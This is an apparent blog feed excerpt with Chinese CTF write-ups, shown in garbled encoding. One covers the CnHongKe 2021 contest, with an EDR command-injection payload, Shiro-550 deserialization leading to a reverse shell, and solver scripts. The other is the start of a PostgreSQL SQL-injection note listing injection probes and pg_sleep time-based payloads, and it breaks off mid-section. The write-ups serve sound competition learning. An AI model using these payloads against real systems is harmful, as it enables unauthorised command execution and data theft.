            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CnHongKe2021å…¬æµ‹èµ›</title>
      <link href="article/2021gongcesai/"/>
      <url>article/2021gongcesai/</url>
      
        <content type="html"><![CDATA[<p>2æœˆ5æ—¥</p><p>æ¯”èµ›æƒ…å†µï¼š</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>å°æ¯”èµ›</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>ä¸»åŠæ–¹å¹³å°å…³å¤ªå¿«äº†2333ï¼Œç¡äº†ä¸€è§‰èµ·æ¥è¿å¹³å°éƒ½æ²¡äº†</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGIè§£ææ¼æ´å‡ºç°çš„åŸå› æ˜¯ï¼ˆ ï¼‰</p><ul><li><p>A.cgi.fix_pathié…ç½®é”™è¯¯</p></li><li><p>B.cgi.fix_pathinfoé…ç½®é”™è¯¯</p></li><li><p>C.phpinfoé…ç½®é”™è¯¯</p></li><li><p>D.cgi.fix__status_ené…ç½®é”™è¯¯</p></li></ul><p>å¾ˆæ˜¾ç„¶æ˜¯<code>cgi.fix_pathinfo</code>é…ç½®é”™è¯¯ï¼Œå½“è®¾ç½®äº†cgi.fix_pathinfo = 1æ—¶ï¼ŒPHPå°±ä¼šä»¥â€™/â€˜ä¸ºåˆ†å‰²ç¬¦ä»æœ€åä¸€ä¸ªæ–‡ä»¶å¼€å§‹å‘å‰æ‰¾å­˜åœ¨çš„æ–‡ä»¶å»æ‰§è¡Œï¼Œä¾‹å¦‚<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="æ‰­è½¬ä¹¾å¤"><a href="#æ‰­è½¬ä¹¾å¤" class="headerlink" title="æ‰­è½¬ä¹¾å¤"></a>æ‰­è½¬ä¹¾å¤</h3><p>æ‰«ç å¾—flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>æ·±ä¿¡æœè½½å…¥å²å†Œ</p><p>ç›´æ¥payloadæ‰“</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>è¿™é¢˜å»å¹´æœ‰è¿‡ï¼Œæ˜¯ä½œä¸ºçº¿ä¸‹èµ›çš„é¢˜ç›®ï¼Œå½“æ—¶æ²¡å¤–ç½‘ï¼Œåªèƒ½ç¡¬å®¡ï¼Œæˆ–è€…â€¦<del>è®°å¾—payload</del>ï¼Œæ¯•ç«Ÿå¤ªæœ‰åäº†â€¦</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰</p><p>ç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>å¯ä»¥å¦‚ <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">å‚è€ƒæ–‡ç« </a> æ‰€ç¤ºï¼Œåˆ©ç”¨<code>shiro.py</code>ç”Ÿæˆpayload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>å½“ç„¶åæ¥æ‰å‘ç°æ›´ç®€å•çš„ï¼Œç›´æ¥ç”¨ <code>ShiroScan</code> å·¥å…·ï¼Œå¯ä»¥ç”¨DNSlogçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥åå¼¹shellï¼Œè¿™é‡Œç›´æ¥åå¼¹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>æˆåŠŸå¼¹åˆ°shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>è€è„šæœ¬å¤§å¸ˆäº†</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>å†™ä¸ªpyè„šæœ¬å³å¯ï¼Œç›´æ¥ä¸Špayloadï¼Œè¹©è„šç¼–ç¨‹ï¼Œå¸ˆå‚…ä»¬è§è°…â€¦</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/2/5 9:22@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"æäº¤"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------å–å­—ç¬¦ä¸²"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------è®¡æ•°"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------æ’åº"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------å–key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------èµ‹data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------æäº¤"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>ç¼–ç¼–æ”¹æ”¹å‡‘åˆç”¨</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCCçš„é¢˜ç›®æ”¹é¢˜<code>æ²¡æœ‰é¢˜ç›®çš„é¢˜ç›®</code></p><p>ä¸»è¦ä»£ç </p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQå›¾ç‰‡20210205171005" loading="lazy"><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>ç”µè¯éŸ³ï¼Œç½‘ä¸Šæœ‰åœ¨çº¿è¯†åˆ«ç½‘ç«™</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>æ ¼å¼è¦æ±‚<code>.wav</code>ï¼Œå…ˆç”¨ffmpegè½¬æ ¼å¼</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>å†æ”¾ä¸Šå»è¯†åˆ«</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>äºŒç»´ç ä¿®å¤ç½‘ç«™ <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>æ‰‹ æ’¸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>ç„¶å</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>æœ€å</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>ä¹Ÿå¯ä»¥æ‰‹ç®—â€¦æ¯•ç«Ÿæ•°æ®åŸŸçš„åŠè¾¹ä¸œè¥¿ç»™äº†</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™äº›é¢˜ç›®ä½œä¸ºçº¿ä¸‹èµ›é¢˜ç›®æ˜¯éš¾äº†ï¼Œæ¯•ç«Ÿå»å¹´æœ‰è¿‡ä¸€æ¬¡çº¿ä¸‹ï¼Œçº¿ä¸Šèµ›å°±ä¸è¯´äº†ï¼Œç¥ä»™ä¹±æ–—2333ï¼Œè¿˜ä¸ç”¨äº¤WPï¼Œå¸Œæœ›ä¸»åŠæ–¹èƒ½å®Œå–„èµ›åˆ¶ï¼Œé¦–å…ˆèµ›åéƒ½ä¸ç”¨äº¤WPæ˜¯æŒºç¦»è°±çš„ï¼Œå…¶æ¬¡é¢˜ç›®çš„è´¨é‡â€¦å…¶å®è¿˜è¡Œï¼Œä½†ä½œä¸ºçº¿ä¸Šè¿˜æ˜¯ç®€å•äº†ï¼Œä¸€ç¯‡wpå´å†™ä¸å‡ºå¤šå°‘ä¸œè¥¿ï¼Œé€šç¯‡å…«é¢˜ä»…ä»…ä¸€åƒå­—ï¼Œå¯èƒ½æ˜¯é¢˜ç›®é—®é¢˜ï¼Œä¹Ÿæœ‰ä¸€éƒ¨åˆ†æˆ‘çš„é—®é¢˜ï¼Œæ€»ä¹‹å¤šå¤šæ€»ç»“å§ã€‚</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>æ‡‚çš„éƒ½æ‡‚2333</p><p>è¿˜æ˜¯æœ‰äº›æ”¶è·çš„ï¼Œæå‰ç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹æ¯2021æ–°æ˜¥æ¬¢ä¹èµ›ä¸€é“é¢˜â€”â€”æŒ‰Fæ³¨å…¥ å¯¹pgsqlçš„ç ”ç©¶</title>
      <link href="article/cqb2021/"/>
      <url>article/cqb2021/</url>
      
        <content type="html"><![CDATA[<p>åªåšäº†ä¸€é“é¢˜ï¼ŒæŒ‰Fæ³¨å…¥ï¼Œç ”ç©¶äº†pgsqlï¼Œç®—ä¸ªå°ç¬”è®°ï¼Œä¸èƒ½ç®—ç ”ç©¶æ€§æ–‡ç« </p><a id="more"></a><h2 id="æŒ‰Fæ³¨å…¥"><a href="#æŒ‰Fæ³¨å…¥" class="headerlink" title="æŒ‰Fæ³¨å…¥"></a>æŒ‰Fæ³¨å…¥</h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°åªèƒ½æ‰‹æœºè®¿é—®ï¼Œçœ‹åˆ°äº†æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>åªæœ‰æ‰‹æœºæ‰èƒ½è®¿é—®<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//ä»HTTP_USER_AGENTä¸­æŸ¥æ‰¾æ‰‹æœºæµè§ˆå™¨çš„å…³é”®å­—--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>äºæ˜¯åœ¨HEADERé‡Œæ·»åŠ <code>User-Agent: mobile</code>å³å¯</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>ç‚¹å‡»ä»»ä½•éƒ½æ˜¯JavaScriptè„šæœ¬<code>javascript:alert(&#39;æŠ•ç¥¨æˆåŠŸ,æ­å–œæ‚¨è·å¾—å¥¶å¥¶ä¸€ä¸ª&#39;)</code>ï¼Œåº•éƒ¨å‘ç°äº†æç¤º</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;æˆ‘é€‰æ‹©æŒ‰ä¸‹Fè¿›å…¥TK&lt;/a&gt;--&gt;</code></p><p>äºæ˜¯è®¿é—®<code>./?f=1</code>æ²¡æœ‰å˜åŒ–ï¼ŒçŒœæµ‹SSRFæˆ–SQLæ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰å…¶ä»–æç¤ºã€‚</p><p>è®¿é—®<code>./?f=1&#39;</code>å‘ç°æœ‰å¼¹çª—</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="å°å“¥å“¥" loading="lazy"><p>fuzzä¸€æ³¢ï¼Œå‘ç°<code>#</code>å’Œ<code>%23</code>éƒ½ä¼šä¸€ç›´å¼¹çª—ï¼Œè€Œä½¿ç”¨<code>--</code>æ³¨é‡Šå³<code>?f=1&#39; --</code>å´ä¸ä¼šå¼¹çª—ï¼Œæœç´¢ä¸€æ³¢å‘ç°æ˜¯ PostgreSQL ï¼ŒçŒœæµ‹<strong>è¯­æ³•é”™è¯¯</strong>æˆ–è€…<strong>æŠ¥é”™</strong>ä¼šæœ‰å¼¹çª—</p><p>ç”šè‡³æœåˆ°äº†åŸé¢˜ï¼Œèµ›åå‘ <a href="https://ha1c9on.top/">@HA1C9ON</a> å¤§ä½¬è¯·æ•™å¾—çŸ¥ï¼Œå½“æ—¶æ¯”èµ›çš„WPæ˜¯æœ‰é”™è¯¯çš„ï¼Œåç»­ä¼šé“æ¥ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹å‘ç°<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39;</code>ï¼Œè­¦å‘Š</li><li><code>gyy&#39; and 1=0 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; and 1=1 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 1 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 2 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 3 --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,2 --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>ï¼Œæ²¡æœ‰è­¦å‘Šï¼ˆæœ‰å»¶è¿Ÿï¼ï¼‰</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,chr(65) --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,chr(-65) --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li></ul></blockquote><p>ç”±order byå¯ä»¥åˆ¤æ–­æ­¤å¤„åˆ—æ•°ä¸º2ï¼Œç”±union selectå¯ä»¥åˆ¤æ–­1å¤„å¯¹åº”åˆ—ä¸ºæ•°å€¼ç±»å‹ï¼Œ2å¤„å¯¹åº”éæ•°å€¼ç±»å‹</p><h3 id="æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥"><a 